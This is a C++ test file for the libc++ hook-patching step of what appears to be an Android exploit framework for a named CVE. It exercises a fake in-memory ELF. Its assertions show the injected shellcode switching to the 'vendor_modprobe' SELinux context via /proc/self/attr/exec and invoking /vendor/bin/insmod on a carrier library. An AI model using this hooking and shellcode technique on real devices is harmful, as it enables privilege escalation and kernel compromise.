/* Host tests for B5-6 libc++ sentry hook apply/restore.
 *
 * A synthesized ELF64 AArch64 fixture stands in for libc++.so; the 16-byte
 * read/write surface is an in-memory fake. The test covers locate -> plan ->
 * apply -> restore -> re-verify (the image must be byte-identical after the
 * restore), the BTI/PAC guard policy, and the failure branches. Nothing here
 * opens a file, forks or writes a syscall. */

#include "backend/cve_2026_43284/steps/hook_patch.hpp"

#include <array>
#include <cassert>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

namespace {
    using ghostlock::backend::cve_2026_43284::steps::apply_hook_patch;
    using ghostlock::backend::cve_2026_43284::steps::build_hook_plan;
    using ghostlock::backend::cve_2026_43284::steps::HookGuardPolicy;
    using ghostlock::backend::cve_2026_43284::steps::HookPatchError;
    using ghostlock::backend::cve_2026_43284::steps::HookPatchIo;
    using ghostlock::backend::cve_2026_43284::steps::HookPatchPlan;
    using ghostlock::backend::cve_2026_43284::steps::kHookDisplacedNone;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxSentrySymbol;
    using ghostlock::backend::cve_2026_43284::steps::kShellcodeMaxBytes;
    using ghostlock::backend::cve_2026_43284::steps::plan_hook_patch;
    using ghostlock::backend::cve_2026_43284::steps::restore_hook_patch;
    using ghostlock::backend::cve_2026_43284::steps::ShellcodeBinding;
    using ghostlock::backend::cve_2026_43284::steps::ShellcodeError;
    using ghostlock::backend::cve_2026_43284::steps::ShellcodeSlotKind;
    using ghostlock::backend::cve_2026_43284::steps::ShellcodeSlotSpec;
    using ghostlock::backend::cve_2026_43284::steps::ShellcodeTemplate;
    using ghostlock::backend::cve_2026_43284::steps::LibcxxHookBindings;
    using ghostlock::backend::cve_2026_43284::steps::libcxx_shellcode_template;
    using ghostlock::backend::cve_2026_43284::steps::make_libcxx_hook_bindings;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxCarrierMaxBytes;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxDisplacedOffset;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxEntryOffset;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxJumpBackOffset;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxSlotDisplaced;
    using ghostlock::backend::cve_2026_43284::steps::kLibcxxValueSlotCount;

    constexpr std::uint32_t kNop = 0xD503201FU;
    constexpr std::uint32_t kPaciasp = 0xD503233FU;
    constexpr std::uint32_t kBranchOpcode = 0x14000000U;

    constexpr std::uint64_t kTextOff = 0x100U;
    constexpr std::uint64_t kTextVaddr = 0x1000U;
    constexpr std::uint64_t kTextSize = 0x40U;
    constexpr std::uint64_t kDynstrOff = 0x200U;
    constexpr std::uint64_t kDynsymOff = 0x280U;
    constexpr std::uint64_t kShstrOff = 0x300U;
    constexpr std::uint64_t kShoff = 0x340U;
    constexpr std::uint64_t kImageBytes = 0x480U;

    void put16(std::vector<std::uint8_t> &out, std::size_t at, std::uint16_t value) {
        out[at] = static_cast<std::uint8_t>(value & 0xFFU);
        out[at + 1U] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
    }
    void put32(std::vector<std::uint8_t> &out, std::size_t at, std::uint32_t value) {
        out[at] = static_cast<std::uint8_t>(value & 0xFFU);
        out[at + 1U] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
        out[at + 2U] = static_cast<std::uint8_t>((value >> 16U) & 0xFFU);
        out[at + 3U] = static_cast<std::uint8_t>((value >> 24U) & 0xFFU);
    }
    void put64(std::vector<std::uint8_t> &out, std::size_t at, std::uint64_t value) {
        for (std::size_t i = 0U; i < 8U; ++i) {
            out[at + i] = static_cast<std::uint8_t>((value >> (8U * i)) & 0xFFU);
        }
    }
    std::uint32_t read32(const std::uint8_t *p) {
        return static_cast<std::uint32_t>(p[0]) |
               (static_cast<std::uint32_t>(p[1]) << 8U) |
               (static_cast<std::uint32_t>(p[2]) << 16U) |
               (static_cast<std::uint32_t>(p[3]) << 24U);
    }

    std::vector<std::uint8_t> build_fixture(std::uint64_t exec_memsz = 0x200U) {
        std::vector<std::uint8_t> out(kImageBytes, 0U);
        out[0] = 0x7FU;
        out[1] = 'E';
        out[2] = 'L';
        out[3] = 'F';
        out[4] = 2U;
        out[5] = 1U;
        out[6] = 1U;
        put16(out, 0x10U, 3U);    /* ET_DYN */
        put16(out, 0x12U, 0xB7U); /* EM_AARCH64 */
        put32(out, 0x14U, 1U);
        put64(out, 0x20U, 0x40U); /* e_phoff */
        put64(out, 0x28U, kShoff);
        put16(out, 0x36U, 56U);
        put16(out, 0x38U, 1U);
        put16(out, 0x3AU, 64U);
        put16(out, 0x3CU, 5U);
        put16(out, 0x3EU, 4U);

        put32(out, 0x40U, 1U);          /* PT_LOAD */
        put32(out, 0x44U, 5U);          /* PF_R | PF_X */
        put64(out, 0x48U, kTextOff);
        put64(out, 0x50U, kTextVaddr);
        put64(out, 0x58U, kTextVaddr);
        put64(out, 0x60U, kTextSize);   /* p_filesz */
        put64(out, 0x68U, exec_memsz);  /* p_memsz */

        for (std::size_t i = 0U; i < kTextSize / 4U; ++i) {
            put32(out, static_cast<std::size_t>(kTextOff) + i * 4U, kNop);
        }
        put32(out, static_cast<std::size_t>(kTextOff) + 0x8U, kNop);   /* sentry */
        put32(out, static_cast<std::size_t>(kTextOff) + 0x10U, kPaciasp); /* pac_entry */
        put32(out, static_cast<std::size_t>(kTextOff) + 0x14U, kNop);

        std::string dynstr;
        dynstr.push_back('\0');
        const std::uint32_t sentry_name = static_cast<std::uint32_t>(dynstr.size());
        dynstr += kLibcxxSentrySymbol;
        dynstr.push_back('\0');
        const std::uint32_t pac_name = static_cast<std::uint32_t>(dynstr.size());
        dynstr += "pac_entry";
        dynstr.push_back('\0');
        std::memcpy(out.data() + kDynstrOff, dynstr.data(), dynstr.size());
        /* entry 0 is the null symbol; entries 1/2 are the two functions. */
        const auto put_symbol = [&out](std::size_t index, std::uint32_t name,
                                       std::uint64_t value) {
            const std::size_t at = static_cast<std::size_t>(kDynsymOff) + index * 24U;
            put32(out, at, name);
            out[at + 4U] = 0x12U; /* GLOBAL | FUNC */
            put16(out, at + 6U, 1U); /* .text */
            put64(out, at + 8U, value);
            put64(out, at + 16U, 8U);
        };
        put_symbol(1U, sentry_name, kTextVaddr + 0x8U);
        put_symbol(2U, pac_name, kTextVaddr + 0x10U);

        const char shstr[] = "\0.text\0.dynstr\0.dynsym\0.shstrtab\0";
        std::memcpy(out.data() + kShstrOff, shstr, sizeof(shstr));

        const auto put_section = [&out](std::size_t index, std::uint32_t name,
                                        std::uint32_t type, std::uint64_t flags,
                                        std::uint64_t addr, std::uint64_t off,
                                        std::uint64_t size, std::uint32_t link,
                                        std::uint64_t entsize) {
            const std::size_t at = static_cast<std::size_t>(kShoff) + index * 64U;
            put32(out, at, name);
            put32(out, at + 4U, type);
            put64(out, at + 8U, flags);
            put64(out, at + 0x10U, addr);
            put64(out, at + 0x18U, off);
            put64(out, at + 0x20U, size);
            put32(out, at + 0x28U, link);
            put64(out, at + 0x38U, entsize);
        };
        put_section(1U, 1U, 1U, 0x6U, kTextVaddr, kTextOff, kTextSize, 0U, 0U);
        put_section(2U, 7U, 3U, 0x2U, 0x2000U, kDynstrOff, dynstr.size(), 0U, 0U);
        put_section(3U, 15U, 11U, 0x2U, 0x3000U, kDynsymOff, 72U, 2U, 24U);
        put_section(4U, 23U, 3U, 0U, 0U, kShstrOff, sizeof(shstr), 0U, 0U);
        return out;
    }

    struct FakeImage final {
        std::vector<std::uint8_t> bytes;
        bool fail_write = false;
    };

    std::int32_t fake_write16(void *raw, std::uint64_t offset,
                              const void *bytes16) noexcept {
        auto *image = static_cast<FakeImage *>(raw);
        if (image == nullptr || bytes16 == nullptr || offset + 16U > image->bytes.size()) {
            return 1;
        }
        if (image->fail_write) {
            return 2;
        }
        std::memcpy(image->bytes.data() + offset, bytes16, 16U);
        return 0;
    }

    long fake_read16(void *raw, std::uint64_t offset,
                     std::uint8_t out[16]) noexcept {
        auto *image = static_cast<FakeImage *>(raw);
        if (image == nullptr || out == nullptr || offset + 16U > image->bytes.size()) {
            return -1;
        }
        std::memcpy(out, image->bytes.data() + offset, 16U);
        return 16;
    }

    HookPatchIo make_io(FakeImage &image) noexcept {
        HookPatchIo io{};
        io.ctx = &image;
        io.write16 = &fake_write16;
        io.read16 = &fake_read16;
        return io;
    }

    /* 16 bytes of NOP bytes; slot 0 receives the displaced instruction. */
    std::array<std::uint8_t, 16> make_template_bytes() {
        std::array<std::uint8_t, 16> bytes{};
        for (std::size_t i = 0U; i < 4U; ++i) {
            const std::uint32_t word = kNop;
            bytes[i * 4U + 0U] = static_cast<std::uint8_t>(word & 0xFFU);
            bytes[i * 4U + 1U] = static_cast<std::uint8_t>((word >> 8U) & 0xFFU);
            bytes[i * 4U + 2U] = static_cast<std::uint8_t>((word >> 16U) & 0xFFU);
            bytes[i * 4U + 3U] = static_cast<std::uint8_t>((word >> 24U) & 0xFFU);
        }
        return bytes;
    }
} // namespace

int main() {
    const std::vector<std::uint8_t> original = build_fixture();
    const std::array<std::uint8_t, 16> template_bytes = make_template_bytes();
    const ShellcodeSlotSpec slots[1] = {{0U, 4U, ShellcodeSlotKind::Instruction}};
    const ShellcodeTemplate tmpl{template_bytes.data(), template_bytes.size(), slots, 1U};
    const std::array<std::uint8_t, kShellcodeMaxBytes> zero{};

    /* ---- plan + apply + restore + re-verify. ---- */
    {
        FakeImage image{original, false};
        const HookPatchIo io = make_io(image);
        std::array<std::uint8_t, kShellcodeMaxBytes> shell{};
        std::array<std::uint8_t, kShellcodeMaxBytes> shell_orig{};
        HookPatchPlan plan{};
        HookPatchError error = HookPatchError::None;
        assert(plan_hook_patch(original.data(), original.size(), kLibcxxSentrySymbol,
                               HookGuardPolicy::Reject, tmpl, nullptr, 0U, 0U,
                               shell.data(), shell.size(), shell_orig.data(), io, plan,
                               error));
        assert(error == HookPatchError::None);
        assert(plan.valid);
        assert(plan.hook.hook_file_offset == kTextOff + 0x8U);
        assert(plan.hook.shellcode_file_offset == kTextOff + kTextSize);
        assert(plan.shellcode_size == 16U);
        assert(plan.trampoline_offset == kTextOff);
        assert(plan.trampoline_pos == 8U);
        /* Planning reads but never writes. */
        assert(image.bytes == original);
        /* The displaced instruction landed in slot 0 and the last word is the
         * jump back, not the template NOP. */
        assert(read32(shell.data()) == kNop);
        assert(read32(shell.data() + 12U) != kNop);
        assert(read32(shell.data() + 12U) == plan.hook.jump_back_instruction);
        /* Trampoline only patches the four branch bytes. */
        assert(read32(plan.trampoline_new + 8U) == plan.hook.branch_instruction);
        assert((plan.hook.branch_instruction & ~0x03FFFFFFU) == kBranchOpcode);
        assert(std::memcmp(plan.trampoline_new, plan.trampoline_orig, 8U) == 0);
        assert(std::memcmp(plan.trampoline_new + 12U, plan.trampoline_orig + 12U, 4U) == 0);
        assert(std::memcmp(shell_orig.data(), original.data() + kTextOff + kTextSize,
                           16U) == 0);

        assert(apply_hook_patch(plan, io, error));
        assert(read32(image.bytes.data() + kTextOff + 0x8U) ==
               plan.hook.branch_instruction);
        assert(std::memcmp(image.bytes.data() + kTextOff + kTextSize, shell.data(),
                           16U) == 0);
        assert(image.bytes != original);

        assert(restore_hook_patch(plan, io, error));
        assert(image.bytes == original);
    }

    /* ---- BTI/PAC guard policy: Reject fails, Skip advances one word. ---- */
    {
        FakeImage image{original, false};
        const HookPatchIo io = make_io(image);
        std::array<std::uint8_t, kShellcodeMaxBytes> shell{};
        std::array<std::uint8_t, kShellcodeMaxBytes> shell_orig{};
        HookPatchPlan plan{};
        HookPatchError error = HookPatchError::None;
        assert(!plan_hook_patch(original.data(), original.size(), "pac_entry",
                                HookGuardPolicy::Reject, tmpl, nullptr, 0U, 0U,
                                shell.data(), shell.size(), shell_orig.data(), io, plan,
                                error));
        assert(error == HookPatchError::GuardRejected);

        error = HookPatchError::None;
        assert(plan_hook_patch(original.data(), original.size(), "pac_entry",
                               HookGuardPolicy::Skip, tmpl, nullptr, 0U, 0U,
                               shell.data(), shell.size(), shell_orig.data(), io, plan,
                               error));
        assert(error == HookPatchError::None);
        assert(plan.valid);
        assert(plan.hook.hook_file_offset == kTextOff + 0x14U);
        assert(plan.hook.guard_skipped);
        assert(plan.trampoline_pos == 4U);
    }

    /* ---- plan failure branches. ---- */
    {
        FakeImage image{original, false};
        const HookPatchIo io = make_io(image);
        std::array<std::uint8_t, kShellcodeMaxBytes> shell{};
        std::array<std::uint8_t, kShellcodeMaxBytes> shell_orig{};
        HookPatchPlan plan{};
        HookPatchError error = HookPatchError::None;

        assert(!plan_hook_patch(nullptr, 0U, kLibcxxSentrySymbol, HookGuardPolicy::Reject, tmpl,
                                nullptr, 0U, 0U, shell.data(), shell.size(),
                                shell_orig.data(), io, plan, error));
        assert(error == HookPatchError::NullImage);

        assert(!plan_hook_patch(original.data(), original.size(), "absent",
                                HookGuardPolicy::Reject, tmpl, nullptr, 0U, 0U,
                                shell.data(), shell.size(), shell_orig.data(), io, plan,
                                error));
        assert(error == HookPatchError::TargetNotFound);

        HookPatchIo unavailable{};
        error = HookPatchError::None;
        assert(!plan_hook_patch(original.data(), original.size(), kLibcxxSentrySymbol,
                                HookGuardPolicy::Reject, tmpl, nullptr, 0U, 0U,
                                shell.data(), shell.size(), shell_orig.data(), unavailable,
                                plan, error));
        assert(error == HookPatchError::IoUnavailable);

        /* Reusing one buffer for new+original is rejected before any write. */
        error = HookPatchError::None;
        assert(!plan_hook_patch(original.data(), original.size(), kLibcxxSentrySymbol,
                                HookGuardPolicy::Reject, tmpl, nullptr, 0U, 0U,
                                shell.data(), shell.size(), shell.data(), io, plan,
                                error));
        assert(error == HookPatchError::ShellcodeBufferTooSmall);

        /* kHookDisplacedNone opts out of the displaced slot; the caller must
         * then bind it or the template keeps its NOP. */
        error = HookPatchError::None;
        assert(plan_hook_patch(original.data(), original.size(), kLibcxxSentrySymbol,
                               HookGuardPolicy::Reject, tmpl, nullptr, 0U,
                               kHookDisplacedNone, shell.data(), shell.size(),
                               shell_orig.data(), io, plan, error));
        assert(plan.valid);
    }

    /* ---- apply/restore failure and invalid-plan branches. ---- */
    {
        FakeImage image{original, false};
        const HookPatchIo io = make_io(image);
        std::array<std::uint8_t, kShellcodeMaxBytes> shell{};
        std::array<std::uint8_t, kShellcodeMaxBytes> shell_orig{};
        HookPatchPlan plan{};
        HookPatchError error = HookPatchError::None;
        assert(plan_hook_patch(original.data(), original.size(), kLibcxxSentrySymbol,
                               HookGuardPolicy::Reject, tmpl, nullptr, 0U, 0U,
                               shell.data(), shell.size(), shell_orig.data(), io, plan,
                               error));

        image.fail_write = true;
        assert(!apply_hook_patch(plan, io, error));
        assert(error == HookPatchError::WriteFailed);
        image.fail_write = false;

        HookPatchPlan invalid{};
        error = HookPatchError::None;
        assert(!apply_hook_patch(invalid, io, error));
        assert(error == HookPatchError::InvalidPlan);
        assert(!restore_hook_patch(invalid, io, error));
        assert(error == HookPatchError::NotApplied);
    }

    /* ---- embedded upstream libcxx.S: bindings -> plan -> fake apply/restore
     * on a larger executable segment (the blob is 480 padded bytes). ---- */
    {
        const std::vector<std::uint8_t> libcxx_original = build_fixture(0x400U);
        FakeImage image{libcxx_original, false};
        const HookPatchIo io = make_io(image);

        LibcxxHookBindings bindings{};
        bindings.carrier_path = "/vendor/lib64/libstagefrighthw.so";
        ShellcodeBinding bound[kLibcxxValueSlotCount]{};
        std::size_t bound_count = 0U;
        ShellcodeError shell_error = ShellcodeError::None;
        assert(make_libcxx_hook_bindings(bindings, bound, bound_count, shell_error));
        assert(shell_error == ShellcodeError::None);
        assert(bound_count == kLibcxxValueSlotCount);

        const ShellcodeTemplate libcxx_tmpl = libcxx_shellcode_template();
        assert(libcxx_tmpl.size == 472U);
        assert(libcxx_tmpl.entry_offset == kLibcxxEntryOffset);
        assert(libcxx_tmpl.jump_back_offset == kLibcxxJumpBackOffset);

        std::array<std::uint8_t, kShellcodeMaxBytes> shell{};
        std::array<std::uint8_t, kShellcodeMaxBytes> shell_orig{};
        HookPatchPlan plan{};
        HookPatchError error = HookPatchError::None;
        assert(plan_hook_patch(libcxx_original.data(), libcxx_original.size(),
                               kLibcxxSentrySymbol, HookGuardPolicy::Reject,
                               libcxx_tmpl, bound, bound_count, kLibcxxSlotDisplaced,
                               shell.data(), shell.size(), shell_orig.data(), io,
                               plan, error));
        assert(error == HookPatchError::None);
        assert(plan.valid);
        assert(plan.shellcode_size == 480U);
        assert(plan.hook.entry_offset == kLibcxxEntryOffset);
        assert(plan.hook.jump_back_offset == kLibcxxJumpBackOffset);
        /* The hook branch targets the blob entry (payload + 0x90), not the
         * string prefix at offset 0. */
        assert(plan.hook.branch_instruction ==
               (kBranchOpcode |
                (((0x1040U + kLibcxxEntryOffset) - (kTextVaddr + 0x8U)) / 4U)));

        /* Bound strings landed in place; the SELinux length immediate is the
         * context size plus the trailing NUL that upstream writes. */
        assert(std::memcmp(shell.data(), "/dev/df", 7U) == 0);
        assert(shell[7U] == 0U);
        assert(std::memcmp(shell.data() + 0x08U, "u:r:vendor_modprobe:s0", 22U) == 0);
        assert(shell[0x08U + 22U] == 0U);
        assert(std::memcmp(shell.data() + 0x1FU, "/proc/self/attr/exec", 20U) == 0);
        assert(shell[0x1FU + 20U] == 0U);
        assert(std::memcmp(shell.data() + 0x34U, "/vendor/bin/insmod", 18U) == 0);
        assert(std::memcmp(shell.data() + 0x47U,
                           "/vendor/lib64/libstagefrighthw.so", 33U) == 0);
        assert(shell[0x47U + 33U] == 0U);
        const std::uint32_t expected_movz = 0xD2800000U | (23U << 5U) | 2U;
        assert(read32(shell.data() + 0x16CU) == expected_movz);
        /* Displaced instruction into the inst-copy slot, jump back into the raw
         * blob's last word, and the 8 padding bytes stay zero. */
        assert(read32(shell.data() + kLibcxxDisplacedOffset) == kNop);
        assert(read32(shell.data() + kLibcxxJumpBackOffset) ==
               plan.hook.jump_back_instruction);
        for (std::size_t i = 472U; i < 480U; ++i) assert(shell[i] == 0U);

        assert(apply_hook_patch(plan, io, error));
        assert(read32(image.bytes.data() + static_cast<std::size_t>(kTextOff) + 0x8U) ==
               plan.hook.branch_instruction);
        assert(std::memcmp(image.bytes.data() + 0x140U, shell.data(), 480U) == 0);
        assert(restore_hook_patch(plan, io, error));
        assert(image.bytes == libcxx_original);
    }

    /* ---- libcxx binding validation: empty and oversized carrier paths. ---- */
    {
        ShellcodeBinding bound[kLibcxxValueSlotCount]{};
        std::size_t count = 0U;
        ShellcodeError shell_error = ShellcodeError::None;

        LibcxxHookBindings empty{};
        assert(!make_libcxx_hook_bindings(empty, bound, count, shell_error));
        assert(shell_error == ShellcodeError::EmptyValue);

        const std::string long_path(kLibcxxCarrierMaxBytes, 'a');
        LibcxxHookBindings too_long{};
        too_long.carrier_path = long_path;
        assert(!make_libcxx_hook_bindings(too_long, bound, count, shell_error));
        assert(shell_error == ShellcodeError::ValueTooLong);

        LibcxxHookBindings ok{};
        ok.carrier_path = "/vendor/lib64/libx.so";
        assert(make_libcxx_hook_bindings(ok, bound, count, shell_error));
        assert(count == kLibcxxValueSlotCount);
        assert(bound[0].bytes == "/dev/df");
        assert(bound[1].bytes == "u:r:vendor_modprobe:s0");
        assert(bound[2].immediate == (0xD2800000U | (23U << 5U) | 2U));
        assert(bound[3].bytes == "/proc/self/attr/exec");
        assert(bound[4].bytes == "/vendor/bin/insmod");
        assert(bound[5].bytes == "/vendor/lib64/libx.so");
    }

    /* Silence the unused zero buffer helper without a warning. */
    assert(zero[0] == 0U);

    std::puts("cve_2026_43284_hook_patch_test: OK");
    return 0;
}
